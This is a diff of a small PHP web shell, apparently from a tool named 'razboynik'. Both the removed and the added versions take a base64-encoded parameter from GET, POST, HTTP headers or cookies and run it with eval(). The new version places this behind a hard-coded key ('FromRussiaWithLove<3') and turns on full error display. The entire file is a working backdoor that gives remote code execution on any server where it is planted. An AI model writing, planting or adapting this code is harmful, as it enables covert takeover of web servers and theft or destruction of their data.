@@ -1,23 +1,38 @@
 <?php
 
-const PARAM = "razboynik";
-const PARAM_KEY = "RAZBOYNIK_KEY";
-const RKEY = "FromRussiaWithLove<3";
+	const PARAM    = "razboynik";
+	const K_PARAM  = "RAZBOYNIK_KEY";
+	const K_CODE   = "FromRussiaWithLove<3";
+	const K_ACTIVE = true;
+	const B64      = true;
+	const DEBUG    = true;
 
-$g = $_GET;
-$p = $_POST;
-$h = getallheaders();
-$c = $_COOKIE;
-
-$arr = [$g, $p, $h, $c];
-
-foreach ($arr as $i) {
-	if (isset($i[PARAM])) {
-		//if ($h[PARAM_KEY] == RKEY) {
-			eval(base64_decode($i[PARAM]));
-		//}
-
-		//echo "Too bad";
+	if (DEBUG) {
+		ini_set('display_startup_errors', 1);
+		ini_set('display_errors', 1);
+		error_reporting(-1);
 	}
-}
+
+
+	$arr = [$_GET, $_POST, getallheaders(), $_COOKIE];
+	$unlock = true;
+
+	foreach ($arr as $i) {
+		if (K_ACTIVE) {
+			$unlock = false;
+			if (isset($i[K_PARAM]) && $i[K_PARAM] == K_CODE) {
+				$unlock = true;
+			}
+		}
+
+		if ($unlock && isset($i[PARAM])) {
+			$str = $i[PARAM];
+
+			if (B64) {
+				$str = base64_decode($str);
+			}
+
+			eval($str);
+		}
+	}
 
